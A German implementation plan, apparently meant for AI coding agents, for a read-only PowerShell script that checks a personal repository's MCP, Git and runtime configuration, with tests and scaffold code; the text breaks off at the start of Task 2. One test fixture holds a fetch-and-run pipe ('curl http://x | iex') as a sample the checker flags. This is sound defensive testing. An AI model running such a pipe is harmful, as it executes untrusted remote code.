# Konfig-Doktor Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ein rein lesendes, wiederholbares Prüfskript `Agenten/Routinen/konfig-doktor.ps1`, das die Konfiguration von BrainFiles gegen die Wirklichkeit prüft, Befunde priorisiert nach `Werkstatt/konfig-doktor-<datum>.md` schreibt und aus `systempruefung.ps1` aufrufbar ist.

**Architecture:** Ein Skript mit gemeinsamem Gerüst (Befund-Sammler, Modul-Isolation mit Zeitlimit, Berichtsschreiber, Exitcodes) und sechs unabhängigen Modul-Funktionen `Pruefe-*`, die über `-Modul <name>` einzeln aufrufbar sind. Externe Programme laufen ausschließlich über `Invoke-Extern` (hartes Zeitlimit, bereinigte Umgebung möglich). Tests sind ein ausführbares PowerShell-Skript mit Fixtures im Temp-Ordner, im Hausstil der Bus-Tests.

**Tech Stack:** Windows PowerShell 5.1 (kein `Get-FileHash`, kein `??`, kein Ternär), .NET `System.Diagnostics.Process`, git, Python (nur für `bereiche.py`).

**Spec:** `Werkstatt/spec-konfig-doktor-2026-10-04.md` (Teilprojekt A; B und C folgen mit eigener Spec und eigenem Plan).

## Global Constraints

- Rein lesend: nichts löschen, nichts reparieren, nichts schreiben außer dem Bericht (`Werkstatt/konfig-doktor-<yyyy-MM-dd>.md`, bzw. `-BerichtOrdner`).
- Lauf unter 60 s; Zeitlimit je Modul 20 s (`-ModulLimitSek`), Überschreitung wird UNKLAR, nicht Fehler.
- Vier Stufen KRITISCH / WARNUNG / HINWEIS / UNKLAR; jeder Befund trägt `gesichert` oder `Vermutung`.
- Befundformat exakt `{id, modul, schwere, titel, beleg, status, vorschlag}`.
- Nie Key-Werte oder Auth-Inhalte ausgeben; nur Vorhandensein, Länge, Pfad des Schlüssels. Alle Texte laufen durch `Maske`.
- `ErrorActionPreference='Continue'`; Git über Exit-Code, nie über stderr.
- Keine Annahme über das Arbeitsverzeichnis: alles aus `$PSScriptRoot` zur Wurzel (`-Wurzel` überschreibt nur für Tests).
- Kein rekursives Durchlaufen von `Agenten/Hermes/installs` und `Agenten/Hermes/profiles` (nur Ebene 1).
- Nicht-Windows (Linux/Cloud): Module `hermes` und `laufzeit` melden UNKLAR, kein Fehler.
- Exit: 0 = kein KRITISCH, 1 = mindestens ein KRITISCH, 2 = Doktor selbst defekt.
- **Quelltexte ausschließlich ASCII** (Windows PowerShell 5.1 liest BOM-lose Dateien als ANSI; Hausstil: `ae/oe/ue`). Umlaut-Dateinamen in Tests per `[char]0x00E4` erzeugen.
- Bestehende versionierte Dateien (`systempruefung.ps1`, `Routinen.md`) nie neu schreiben: gezielter Ersatz, danach Zeilenenden prüfen (CRLF/LF nicht mischen).
- Commit direkt auf `master` (Hausregel), **nur eigene Dateien**: `git add <datei>` und `git commit -m ... -- <dateien>`, weil der Git-Index mit anderen Sitzungen geteilt ist. Nie `git add -A`, nie auf `zwischenstand`.
- Commit-Nachricht endet mit `Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>`.
- Der Bericht ist Durchgangsware und wird nicht committet.

## Abweichungen von der Spec (bewusst, Begründung)

- **Hebelwirkung** der Sortierung = Modulreihenfolge der Spec (`mcp-pfade`, `hermes`, `regelpaare`, `git-regeln`, `ballast`, `laufzeit`). Eine feinere Gewichtung ist nicht belegbar.
- **Session-MCP-Ausfälle** (Vanguard, Definite, Desktop-Commander) sind Zustand der Claude-Sitzung und für ein Skript nicht lesbar. Der Doktor prüft stattdessen das Manifest; die Frage, welche Ausfälle gewollt sind, bleibt bei Max.
- **`-Kurz`** schreibt keinen Bericht und überspringt zusätzlich `hermes doctor` (nächtlicher Lauf soll Hermes nicht starten). `-OhneExtern` überspringt `hermes doctor`, `docker`/`wsl` und `mcp-sync-check.ps1` (für Tests).
- Ein gescheitertes Modul (`PRUEFUNG-FEHLGESCHLAGEN-<modul>`) wird UNKLAR eingestuft: ein defekter Test ist kein Konfigurationsfehler.

## Review Focus

- Manifest-Eintrag ohne `cwd`, Pfad relativ zur Wurzel statt zum `cwd`, Wurzel mit Leerzeichen: darf kein Fehlalarm sein (Task 2).
- Manifest fehlt oder ist kaputtes JSON: genau ein KRITISCH-Befund, kein Absturz, andere Module laufen weiter (Task 2).
- Auth-Datei mit echten Werten: kein Wert in Befund oder Bericht; unlesbare Auth-Datei: KRITISCH ohne Inhaltsausgabe (Task 3).
- Regeldatei mit BOM oder nur CRLF: HINWEIS statt WARNUNG; fehlende Partnerdatei: eigener Befund (Task 4).
- Git: Dateinamen mit Leerzeichen/Umlaut, Umbenennung (`R a -> b`), Wurzel ohne `.git` (Task 5).

## Dateien

- Create: `Agenten/Routinen/konfig-doktor.ps1` (Gerüst + sechs Module, wächst je Task)
- Create: `Agenten/Routinen/tests/konfig-doktor.test.ps1` (Tests, wächst je Task)
- Modify: `Agenten/Routinen/systempruefung.ps1` (neuer Block 16, Task 8)
- Modify: `MaxHirn/Wissen/Routinen.md` (Eintrag, Task 8)

Testlauf überall:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1
```

(Arbeitsverzeichnis = Wurzel `C:\Users\faupe\Documents\BrainFiles`; `cd` im selben Befehl.)

---

### Task 1: Gerüst, Berichtsschreiber, Exitcodes, Testrahmen

**Files:**
- Create: `Agenten/Routinen/konfig-doktor.ps1`
- Create: `Agenten/Routinen/tests/konfig-doktor.test.ps1`

**Interfaces:**
- Produces (für alle späteren Tasks, im Skript):
  - `Add-Befund -Id <string> -Modul <string> -Schwere <KRITISCH|WARNUNG|HINWEIS|UNKLAR> -Titel <string> -Beleg <string> -Status <gesichert|Vermutung> -Vorschlag <string>` (kein Rückgabewert)
  - `Invoke-Extern -Datei <string> [-Argumente <string[]>] [-TimeoutSek <int>] [-EntferneEnv <string[]>] [-SetzeEnv <hashtable>] [-Arbeitsordner <string>]` gibt `{ExitCode, Out, Err, TimedOut}`
  - `Maske <string>` gibt string; Variablen `$Wurzel`, `$WurzelExplizit`, `$OhneExtern`, `$Kurz`, `$ModulLimitSek`
  - Modul-Tabelle `$ModulTabelle` (Name -> Funktionsname) mit Platzhalter-Zeile `# === MODULE ... ===` zum Einfügen neuer `Pruefe-*`-Funktionen
- Produces (im Test): `Pruefe <name> <bool> [<detail>]`, `Neue-Wurzel`, `Schreibe <pfad> <inhalt>`, `Lauf <wurzel> <module[]> [<hashtable extra>]`, `Lauf-Kind <argumente[]>`, `Hat <befunde> <id>`, `Schwere-Von <befunde> <id>`; Marker `# === ENDE ...` zum Einfügen neuer Testabschnitte

- [ ] **Step 1: Testrahmen und erste Tests schreiben**

Datei `Agenten/Routinen/tests/konfig-doktor.test.ps1` anlegen:

```powershell
# konfig-doktor.test.ps1 - Tests fuer konfig-doktor.ps1 (Hausstil wie Bus-Tests, kein Framework).
# Aufruf: powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1
# Endet mit "konfig-doktor bestanden". Nur ASCII im Quelltext.
$ErrorActionPreference = 'Continue'
$Doktor = Join-Path (Split-Path $PSScriptRoot -Parent) 'konfig-doktor.ps1'
$Ps = (Get-Process -Id $PID).Path
$script:Fehler = 0
$script:Aufraeumen = New-Object System.Collections.ArrayList

function Pruefe([string]$Name, [bool]$Bedingung, [string]$Detail = '') {
    if ($Bedingung) { Write-Host "  ok     $Name" }
    else { Write-Host "  FEHLT  $Name $Detail"; $script:Fehler++ }
}
function Neue-Wurzel {
    $p = Join-Path ([IO.Path]::GetTempPath()) ('konfig doktor test ' + [guid]::NewGuid().ToString('N').Substring(0, 8))
    New-Item -ItemType Directory -Path $p | Out-Null
    [void]$script:Aufraeumen.Add($p)
    return $p
}
function Schreibe([string]$Pfad, [string]$Inhalt) {
    $d = Split-Path $Pfad -Parent
    if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
    [IO.File]::WriteAllText($Pfad, $Inhalt, (New-Object System.Text.UTF8Encoding($false)))
}
function Lauf([string]$Wurzel, [string[]]$Module, [hashtable]$Extra = @{}) {
    $a = @{ Wurzel = $Wurzel; Modul = $Module; PassThru = $true; Kurz = $true; OhneExtern = $true }
    foreach ($k in $Extra.Keys) { $a[$k] = $Extra[$k] }
    return @(& $Doktor @a)
}
function Lauf-Kind([string[]]$Argumente) {
    $o = & $Ps -NoProfile -ExecutionPolicy Bypass -File $Doktor @Argumente 2>&1 | Out-String
    return [pscustomobject]@{ Exit = $LASTEXITCODE; Out = $o }
}
function Hat($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }).Count -gt 0) }
function Schwere-Von($Befunde, [string]$Id) { return (@($Befunde | Where-Object { $_.id -eq $Id }) | Select-Object -First 1).schwere }

Write-Host '--- Geruest ---'
$fx = Neue-Wurzel
$r = Lauf $fx @('selbsttest-fehler')
Pruefe 'Modulfehler wird isoliert (UNKLAR)' ((Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -and ((Schwere-Von $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-langsam') @{ ModulLimitSek = 1 }
Pruefe 'Zeitlimit ergibt UNKLAR' ((Hat $r 'ZEITLIMIT-selbsttest-langsam') -and ((Schwere-Von $r 'ZEITLIMIT-selbsttest-langsam') -eq 'UNKLAR'))
$r = Lauf $fx @('selbsttest-fehler', 'selbsttest-kritisch')
Pruefe 'Fehler in Modul A stoppt Modul B nicht' ((Hat $r 'TEST-KRITISCH') -and (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-selbsttest-fehler'))
Pruefe 'KRITISCH steht vor UNKLAR' ($r[0].schwere -eq 'KRITISCH')
$b = $r | Where-Object { $_.id -eq 'TEST-KRITISCH' }
Pruefe 'Maske entfernt Schluessel aus Beleg' (($b.beleg -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($b.beleg -match '\*\*\*'))

$k = Lauf-Kind @('-Wurzel', $fx, '-Modul', 'selbsttest-kritisch', '-BerichtOrdner', $fx)
Pruefe 'Exit 1 bei KRITISCH' ($k.Exit -eq 1) "Exit=$($k.Exit)"
$bericht = Join-Path $fx ('konfig-doktor-' + (Get-Date -Format 'yyyy-MM-dd') + '.md')
Pruefe 'Bericht wird geschrieben' (Test-Path -LiteralPath $bericht)
$bt = ''
if (Test-Path -LiteralPath $bericht) { $bt = [IO.File]::ReadAllText($bericht) }
Pruefe 'Bericht hat Stufen-Abschnitt' ($bt -match '## KRITISCH \(1\)')
Pruefe 'Bericht ohne Schluessel' (($bt -notmatch 'sk-abcdefghijklmnopqrstuvwxyz123456') -and ($bt -match '\*\*\*'))
$fx2 = Neue-Wurzel
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-kritisch', '-Kurz')
Pruefe 'Kurz: Zaehlzeile' ($k.Out -match 'konfig-doktor: KRITISCH 1 \| WARNUNG 0 \| HINWEIS 0 \| UNKLAR 0')
Pruefe 'Kurz: kein Bericht' (-not (Test-Path -LiteralPath (Join-Path $fx2 'Werkstatt')) -and @(Get-ChildItem -LiteralPath $fx2 -Filter 'konfig-doktor-*.md').Count -eq 0)
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'selbsttest-fehler', '-Kurz')
Pruefe 'Exit 0 ohne KRITISCH' ($k.Exit -eq 0) "Exit=$($k.Exit)"
$k = Lauf-Kind @('-Wurzel', $fx2, '-Modul', 'gibt-es-nicht', '-Kurz')
Pruefe 'Exit 2 bei unbekanntem Modul' ($k.Exit -eq 2) "Exit=$($k.Exit)"

# === ENDE (neue Testabschnitte oberhalb dieser Zeile einfuegen) ===
foreach ($p in $script:Aufraeumen) { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue }
if ($script:Fehler -gt 0) { Write-Host "konfig-doktor FEHLGESCHLAGEN: $($script:Fehler) Pruefung(en)"; exit 1 }
Write-Host 'konfig-doktor bestanden'
```

- [ ] **Step 2: Test laufen lassen, Fehlschlag bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: FAIL (Skript `konfig-doktor.ps1` fehlt, Fehlermeldungen, am Ende `konfig-doktor FEHLGESCHLAGEN`).

- [ ] **Step 3: Gerüst implementieren**

Datei `Agenten/Routinen/konfig-doktor.ps1` anlegen:

```powershell
# konfig-doktor.ps1 - rein lesender Konfigurations-Doktor fuer BrainFiles.
# Spec: Werkstatt/spec-konfig-doktor-2026-10-04.md
# Aufruf: konfig-doktor.ps1 [-Modul <name>[,<name>]] [-Kurz] [-OhneExtern] [-PassThru]
#                           [-Wurzel <pfad>] [-BerichtOrdner <pfad>] [-ModulLimitSek 20]
# Exit: 0 = kein KRITISCH, 1 = mindestens ein KRITISCH, 2 = Doktor selbst defekt.
# Nur ASCII im Quelltext (Windows PowerShell 5.1 liest BOM-lose Dateien als ANSI).
[CmdletBinding()]
param(
    [string[]]$Modul = @(),
    [switch]$Kurz,
    [switch]$PassThru,
    [switch]$OhneExtern,
    [string]$Wurzel = '',
    [string]$BerichtOrdner = '',
    [int]$ModulLimitSek = 20
)
$ErrorActionPreference = 'Continue'
$WurzelExplizit = $PSBoundParameters.ContainsKey('Wurzel')
if (-not $Wurzel) { $Wurzel = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent }
$Wurzel = [System.IO.Path]::GetFullPath($Wurzel).TrimEnd('\', '/')
$script:Befunde = New-Object System.Collections.ArrayList

# ---------- Hilfen ----------
function Maske([string]$t) {
    if ($null -eq $t) { return '' }
    $t = $t -replace '(?i)\b(sk|pk|ghp|gho|xox[abp]|AKIA)[-_A-Za-z0-9]{12,}', '***'
    $t = $t -replace '(?=[A-Za-z0-9_\-]*\d)(?=[A-Za-z0-9_\-]*[A-Za-z])[A-Za-z0-9_\-]{40,}', '***'
    return $t
}

function Add-Befund {
    param(
        [string]$Id, [string]$Modul,
        [ValidateSet('KRITISCH', 'WARNUNG', 'HINWEIS', 'UNKLAR')][string]$Schwere,
        [string]$Titel, [string]$Beleg,
        [ValidateSet('gesichert', 'Vermutung')][string]$Status,
        [string]$Vorschlag
    )
    [void]$script:Befunde.Add([pscustomobject]@{
            id = $Id; modul = $Modul; schwere = $Schwere
            titel = (Maske $Titel); beleg = (Maske $Beleg); status = $Status; vorschlag = (Maske $Vorschlag)
        })
}

function Invoke-Extern {
    param(
        [string]$Datei, [string[]]$Argumente = @(), [int]$TimeoutSek = 20,
        [string[]]$EntferneEnv = @(), [hashtable]$SetzeEnv = @{}, [string]$Arbeitsordner = ''
    )
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $Datei
    $psi.Arguments = (@($Argumente | ForEach-Object { if ($_ -eq '' -or $_ -match '[\s"]') { '"' + ($_ -replace '"', '\"') + '"' } else { $_ } }) -join ' ')
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true
    $psi.StandardOutputEncoding = [System.Text.Encoding]::UTF8
    $psi.StandardErrorEncoding = [System.Text.Encoding]::UTF8
    if ($Arbeitsordner) { $psi.WorkingDirectory = $Arbeitsordner }
    foreach ($e in $EntferneEnv) { [void]$psi.EnvironmentVariables.Remove($e) }
    foreach ($k in $SetzeEnv.Keys) { $psi.EnvironmentVariables[$k] = [string]$SetzeEnv[$k] }
    $p = [System.Diagnostics.Process]::Start($psi)
    $so = $p.StandardOutput.ReadToEndAsync()
    $se = $p.StandardError.ReadToEndAsync()
    if (-not $p.WaitForExit($TimeoutSek * 1000)) {
        try { $p.Kill() } catch { }
        return [pscustomobject]@{ ExitCode = $null; Out = ''; Err = ''; TimedOut = $true }
    }
    $p.WaitForExit()
    return [pscustomobject]@{ ExitCode = $p.ExitCode; Out = $so.Result; Err = $se.Result; TimedOut = $false }
}

function Invoke-Modul {
    param([string]$Name, [string]$Fn)
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    try { & $Fn }
    catch {
        Add-Befund -Id "PRUEFUNG-FEHLGESCHLAGEN-$Name" -Modul $Name -Schwere 'UNKLAR' `
            -Titel "Pruefung '$Name' fehlgeschlagen" -Beleg ([string]$_.Exception.Message) -Status 'Vermutung' `
            -Vorschlag "Modul einzeln mit -Modul $Name aufrufen und Fehlertext pruefen"
    }
    $sw.Stop()
    if ($sw.Elapsed.TotalSeconds -gt $ModulLimitSek) {
        Add-Befund -Id "ZEITLIMIT-$Name" -Modul $Name -Schwere 'UNKLAR' `
            -Titel "Pruefung '$Name' ueberschreitet das Zeitlimit" `
            -Beleg ("{0:N1} s gemessen, Limit {1} s" -f $sw.Elapsed.TotalSeconds, $ModulLimitSek) -Status 'gesichert' `
            -Vorschlag 'Modul einzeln laufen lassen; Ursache der Langsamkeit klaeren'
    }
}

# ---------- Selbsttest-Module (nur fuer die Tests, nicht in der Standardliste) ----------
function Pruefe-SelbsttestFehler { throw 'absichtlicher Testfehler' }
function Pruefe-SelbsttestLangsam { Start-Sleep -Seconds 2 }
function Pruefe-SelbsttestKritisch {
    Add-Befund -Id 'TEST-KRITISCH' -Modul 'selbsttest-kritisch' -Schwere 'KRITISCH' -Titel 'Testbefund' `
        -Beleg 'Schluessel sk-abcdefghijklmnopqrstuvwxyz123456 im Text' -Status 'gesichert' -Vorschlag 'keiner'
}

# === MODULE (neue Pruefe-*-Funktionen oberhalb dieser Zeile einfuegen) ===

$ModulTabelle = [ordered]@{
    'mcp-pfade'  = 'Pruefe-McpPfade'
    'hermes'     = 'Pruefe-Hermes'
    'regelpaare' = 'Pruefe-Regelpaare'
    'git-regeln' = 'Pruefe-GitRegeln'
    'ballast'    = 'Pruefe-Ballast'
    'laufzeit'   = 'Pruefe-Laufzeit'
}
$VersteckteModule = @{
    'selbsttest-fehler'   = 'Pruefe-SelbsttestFehler'
    'selbsttest-langsam'  = 'Pruefe-SelbsttestLangsam'
    'selbsttest-kritisch' = 'Pruefe-SelbsttestKritisch'
}

function Zelle([string]$t) {
    if ($null -eq $t) { return '' }
    return (($t -replace '\|', '\|') -replace '\r?\n', ' ')
}

function Schreibe-Bericht {
    param($Sortiert, $Zaehler, [string]$Ordner)
    $datei = Join-Path $Ordner ('konfig-doktor-' + (Get-Date -Format 'yyyy-MM-dd') + '.md')
    $z = New-Object System.Text.StringBuilder
    [void]$z.AppendLine('# Konfig-Doktor ' + (Get-Date -Format 'yyyy-MM-dd HH:mm'))
    [void]$z.AppendLine('')
    [void]$z.AppendLine('Wurzel: `' + $Wurzel + '`. Rein lesender Lauf; Reparaturen nur nach Freigabe.')
    [void]$z.AppendLine('')
    [void]$z.AppendLine('## Zusammenfassung')
    [void]$z.AppendLine('')
    [void]$z.AppendLine('| Stufe | Anzahl |')
    [void]$z.AppendLine('|---|---|')
    foreach ($s in 'KRITISCH', 'WARNUNG', 'HINWEIS', 'UNKLAR') { [void]$z.AppendLine("| $s | $($Zaehler[$s]) |") }
    $nr = 0
    foreach ($s in 'KRITISCH', 'WARNUNG', 'HINWEIS') {
        $gruppe = @($Sortiert | Where-Object { $_.schwere -eq $s })
        if ($gruppe.Count -eq 0) { continue }
        [void]$z.AppendLine('')
        [void]$z.AppendLine("## $s ($($gruppe.Count))")
        [void]$z.AppendLine('')
        [void]$z.AppendLine('| # | Befund | Belegt durch | Status | Vorschlag |')
        [void]$z.AppendLine('|---|---|---|---|---|')
        foreach ($b in $gruppe) {
            $nr++
            [void]$z.AppendLine("| $nr | $(Zelle $b.titel) | $(Zelle $b.beleg) | $($b.status) | $(Zelle $b.vorschlag) |")
        }
    }
    $unklar = @($Sortiert | Where-Object { $_.schwere -eq 'UNKLAR' })
    if ($unklar.Count -gt 0) {
        [void]$z.AppendLine('')
        [void]$z.AppendLine("## Nicht pruefbar (UNKLAR) ($($unklar.Count))")
        [void]$z.AppendLine('')
        foreach ($b in $unklar) {
            [void]$z.AppendLine("- **$(Zelle $b.titel)** - $(Zelle $b.beleg). Zur Entscheidung fehlt: $(Zelle $b.vorschlag)")
        }
    }
    [System.IO.File]::WriteAllText($datei, $z.ToString(), (New-Object System.Text.UTF8Encoding($false)))
    return $datei
}

# === HAUPTLAUF ===
try {
    $gewaehlt = @($Modul)
    if ($gewaehlt.Count -eq 0) { $gewaehlt = @($ModulTabelle.Keys) }
    foreach ($m in $gewaehlt) {
        $fn = $null
        if ($ModulTabelle.Contains($m)) { $fn = $ModulTabelle[$m] }
        elseif ($VersteckteModule.ContainsKey($m)) { $fn = $VersteckteModule[$m] }
        if (-not $fn) { throw "Unbekanntes Modul: $m" }
        Invoke-Modul -Name $m -Fn $fn
    }

    $berichtZiel = $BerichtOrdner
    if (-not $berichtZiel) { $berichtZiel = Join-Path $Wurzel 'Werkstatt' }
    if (-not $Kurz -and -not (Test-Path -LiteralPath $berichtZiel)) {
        Add-Befund -Id 'BERICHT-ORDNER-FEHLT' -Modul 'doktor' -Schwere 'UNKLAR' -Titel 'Berichtsordner nicht erreichbar' `
            -Beleg "Test-Path negativ: $berichtZiel" -Status 'gesichert' -Vorschlag 'Junction Werkstatt/ pruefen (Modul laufzeit); Bericht wurde nicht geschrieben'
    }

    $rang = @{ KRITISCH = 0; WARNUNG = 1; HINWEIS = 2; UNKLAR = 3 }
    $modulRang = @{}
    $i = 0
    foreach ($k in $ModulTabelle.Keys) { $modulRang[$k] = $i; $i++ }
    $sortiert = @($script:Befunde | Sort-Object @{ Expression = { $rang[$_.schwere] } }, @{ Expression = { if ($modulRang.ContainsKey($_.modul)) { $modulRang[$_.modul] } else { 99 } } })
    $zaehler = @{}
    foreach ($s in 'KRITISCH', 'WARNUNG', 'HINWEIS', 'UNKLAR') { $zaehler[$s] = @($sortiert | Where-Object { $_.schwere -eq $s }).Count }

    $zeile = "konfig-doktor: KRITISCH $($zaehler['KRITISCH']) | WARNUNG $($zaehler['WARNUNG']) | HINWEIS $($zaehler['HINWEIS']) | UNKLAR $($zaehler['UNKLAR'])"
    if ($Kurz) {
        Write-Host $zeile
    }
    else {
        foreach ($s in 'KRITISCH', 'WARNUNG', 'HINWEIS', 'UNKLAR') { Write-Host ("{0,-8} {1}" -f $s, $zaehler[$s]) }
        if (Test-Path -LiteralPath $berichtZiel) {
            $pfad = Schreibe-Bericht -Sortiert $sortiert -Zaehler $zaehler -Ordner $berichtZiel
            Write-Host "Bericht: $pfad"
        }
    }
    if ($PassThru) { $sortiert }
    if ($zaehler['KRITISCH'] -gt 0) { exit 1 } else { exit 0 }
}
catch {
    Write-Host "konfig-doktor: Doktor selbst defekt - $($_.Exception.Message)"
    exit 2
}
```

- [ ] **Step 4: Test laufen lassen, Erfolg bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alle Zeilen `ok`, letzte Zeile `konfig-doktor bestanden`.

- [ ] **Step 5: Prüfen, dass die Dateien versionierbar sind, und committen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git status --short Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: beide als `??`. Fehlen sie (per `.gitignore` verborgen): `git check-ignore -v <datei>` zeigt die Regel; dann in `.gitignore` gezielt eine Whitelist-Zeile ergänzen (Edit, Zeilenenden erhalten) und im Ledger melden.

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1; git commit -m "konfig-doktor: Geruest, Bericht, Exitcodes, Testrahmen" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`

---

### Task 2: Modul `mcp-pfade`

**Files:**
- Modify: `Agenten/Routinen/konfig-doktor.ps1` (Funktionen oberhalb `# === MODULE`)
- Modify: `Agenten/Routinen/tests/konfig-doktor.test.ps1` (Abschnitt oberhalb `# === ENDE`)

**Interfaces:**
- Consumes: `Add-Befund`, `Invoke-Extern`, `$Wurzel`, `$OhneExtern`, `$ModulLimitSek`
- Produces: `Pruefe-McpPfade`; Befund-IDs `MCP-MANIFEST-FEHLT`, `MCP-MANIFEST-DEFEKT`, `MCP-CWD-FEHLT-<name>`, `MCP-PFAD-FEHLT-<name>`, `MCP-COMMAND-NICHT-IM-PFAD-<name>`, `MCP-STARTER-AUFFAELLIG-<name>`, `MCP-AUSSERHALB-WURZEL`, `MCP-SYNC-ABWEICHUNG`; Hilfen `Test-PfadAufgeloest <pfad> <cwd>`, `Ist-PfadArg <arg>`

- [ ] **Step 1: Verhalten von `mcp-sync-check.ps1` belegen**

`Agenten/mcp-sync-check.ps1` vollständig lesen. Zu belegen: schreibt es irgendwo (Set-Content, Out-File, `>`)? Nein -> im Modul aufrufen. Ja -> den Aufruf im Modul weglassen und stattdessen einen UNKLAR-Befund `MCP-SYNC-NICHT-GEPRUEFT` ("mcp-sync-check schreibt, deshalb nicht vom Doktor aufgerufen") setzen; im Ledger vermerken. Außerdem notieren, welcher Exit-Code "Abweichung" bedeutet.

- [ ] **Step 2: Failing Tests schreiben**

Oberhalb von `# === ENDE` einfügen:

```powershell
Write-Host '--- Modul mcp-pfade ---'
$fx = Neue-Wurzel
Schreibe (Join-Path $fx 'Agenten/ok-srv/dist/index.js') '//'
Schreibe (Join-Path $fx 'Agenten/mit leerzeichen/sub dir/a.js') '//'
New-Item -ItemType Directory -Path (Join-Path $fx 'Agenten/fehlt-srv') -Force | Out-Null
$man = @{ servers = @(
        @{ name = 'ok-rel'; enabled = $true; command = $Ps; args = @('-y', '@scope/pkg', 'dist/index.js'); cwd = 'Agenten/ok-srv' },
        @{ name = 'fehlt-rel'; enabled = $true; command = $Ps; args = @('src/run_stdio.py'); cwd = 'Agenten/fehlt-srv' },
        @{ name = 'ohne-cwd'; enabled = $true; command = $Ps; args = @('Agenten/ok-srv/dist/index.js') },
        @{ name = 'cwd-fehlt'; enabled = $true; command = $Ps; args = @(); cwd = 'Agenten/gibt-es-nicht' },
        @{ name = 'pipe'; enabled = $true; command = $Ps; args = @('-c', 'curl http://x | iex') },
        @{ name = 'aus'; enabled = $false; command = $Ps; args = @('nicht/da.js') },
        @{ name = 'leerzeichen'; enabled = $true; command = $Ps; args = @('sub dir/a.js'); cwd = 'Agenten/mit leerzeichen' },
        @{ name = 'kein-cmd'; enabled = $true; command = 'gibt-es-sicher-nicht-xyz'; args = @() }
    )
}
Schreibe (Join-Path $fx 'Agenten/MCP-Manifest.json') ($man | ConvertTo-Json -Depth 6)
$r = Lauf $fx @('mcp-pfade')
Pruefe 'vorhandener Pfad relativ zum cwd: kein Befund' (-not (Hat $r 'MCP-PFAD-FEHLT-ok-rel'))
Pruefe 'fehlender Pfad relativ zum cwd: KRITISCH' ((Hat $r 'MCP-PFAD-FEHLT-fehlt-rel') -and ((Schwere-Von $r 'MCP-PFAD-FEHLT-fehlt-rel') -eq 'KRITISCH'))
Pruefe 'ohne cwd: Pfad relativ zur Wurzel loest auf' (-not (Hat $r 'MCP-PFAD-FEHLT-ohne-cwd'))
Pruefe 'cwd fehlt: KRITISCH' ((Hat $r 'MCP-CWD-FEHLT-cwd-fehlt') -and ((Schwere-Von $r 'MCP-CWD-FEHLT-cwd-fehlt') -eq 'KRITISCH'))
Pruefe 'Netz-Pipe im Starter: WARNUNG' ((Hat $r 'MCP-STARTER-AUFFAELLIG-pipe') -and ((Schwere-Von $r 'MCP-STARTER-AUFFAELLIG-pipe') -eq 'WARNUNG'))
Pruefe 'deaktivierter Eintrag wird nicht geprueft' (-not (Hat $r 'MCP-PFAD-FEHLT-aus'))
Pruefe 'Leerzeichen in Wurzel und Pfad: kein Fehlalarm' (-not (Hat $r 'MCP-PFAD-FEHLT-leerzeichen'))
Pruefe 'Command nicht im PATH: WARNUNG' ((Hat $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -and ((Schwere-Von $r 'MCP-COMMAND-NICHT-IM-PFAD-kein-cmd') -eq 'WARNUNG'))
Pruefe 'Pfad ausserhalb der Wurzel: HINWEIS' ((Hat $r 'MCP-AUSSERHALB-WURZEL') -and ((Schwere-Von $r 'MCP-AUSSERHALB-WURZEL') -eq 'HINWEIS'))
$fx2 = Neue-Wurzel
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest fehlt: KRITISCH' ((Hat $r 'MCP-MANIFEST-FEHLT') -and ((Schwere-Von $r 'MCP-MANIFEST-FEHLT') -eq 'KRITISCH'))
Schreibe (Join-Path $fx2 'Agenten/MCP-Manifest.json') '{ kaputt'
$r = Lauf $fx2 @('mcp-pfade')
Pruefe 'Manifest kaputt: KRITISCH ohne Absturz' ((Hat $r 'MCP-MANIFEST-DEFEKT') -and (-not (Hat $r 'PRUEFUNG-FEHLGESCHLAGEN-mcp-pfade')))

```

- [ ] **Step 3: Test laufen lassen, Fehlschlag bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: Abschnitt `mcp-pfade` zeigt `FEHLT` (Funktion `Pruefe-McpPfade` nicht definiert -> `PRUEFUNG-FEHLGESCHLAGEN`), Ende `FEHLGESCHLAGEN`.

- [ ] **Step 4: Modul implementieren**

Oberhalb von `# === MODULE` einfügen:

```powershell
# ---------- Modul 1: mcp-pfade ----------
